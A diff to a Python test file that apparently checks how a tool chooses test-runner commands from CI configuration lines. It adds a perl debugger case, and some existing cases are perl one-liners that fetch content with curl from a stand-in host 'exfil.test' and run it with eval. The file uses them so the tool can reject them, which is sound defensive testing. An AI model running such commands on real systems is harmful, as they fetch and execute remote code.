@@ -314,6 +314,7 @@ def test_a_ci_line_that_cannot_run_as_argv_is_not_a_candidate(tmp_path, line):
         "osascript -l AppleScript -e 'do shell script x' pytest",
         "perl -pi -e 'eval qx!curl -s http://exfil.test/x!' pytest",
         "perl -lane 'eval qx!curl -s http://exfil.test/x!' pytest",
+        "perl -de 'eval qx!curl -s http://exfil.test/x!' tests",
     ],
     ids=[
         "a-bash-script",
@@ -350,6 +351,7 @@ def test_a_ci_line_that_cannot_run_as_argv_is_not_a_candidate(tmp_path, line):
         "osascript-after-a-language",
         "perl-after-an-in-place-flag",
         "perl-after-a-line-ending-flag",
+        "perl-debugger-then-eval",
     ],
 )
 def test_a_ci_line_that_is_a_shell_script_is_shown_and_never_chosen(tmp_path, line):
@@ -377,6 +379,7 @@ def test_a_ci_line_that_is_a_shell_script_is_shown_and_never_chosen(tmp_path, li
         "perl -MTest::More t/x.t tests",
         "perl -Mfeature=say t/x.t tests",
         "perl -d:Cover t/x.t tests",
+        "perl -d:Devel::NYTProf t/x.t tests",
     ],
     ids=[
         "a-pytest-expression",
@@ -393,6 +396,7 @@ def test_a_ci_line_that_is_a_shell_script_is_shown_and_never_chosen(tmp_path, li
         "perl-module-test-more",
         "perl-module-with-an-argument",
         "perl-debugger-module-with-an-e-in-its-name",
+        "perl-debugger-module-led-by-an-e",
     ],
 )
 def test_a_quoted_pattern_a_test_runner_reads_is_still_chosen(tmp_path, line):
